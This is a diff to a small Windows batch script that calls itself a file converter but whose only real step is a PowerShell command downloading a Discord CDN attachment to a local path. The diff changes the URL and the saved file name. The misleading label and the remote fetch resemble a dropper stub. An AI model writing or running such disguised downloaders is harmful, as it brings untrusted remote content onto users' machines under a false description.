@@ -1,4 +1,4 @@
 @echo off
 title convert
 echo converting file
-powershell -Command "Invoke-WebRequest https://cdn.discordapp.com/attachments/503045718102114309/990285885490753586/real_proof.txt" -Outfile "C:\locationuwant\winter.png"
+powershell -Command "Invoke-WebRequest https://cdn.discordapp.com/attachments/1003656590735462501/1003720282508374056/message.txt" -Outfile "C:\locationuwant\winter.txt"
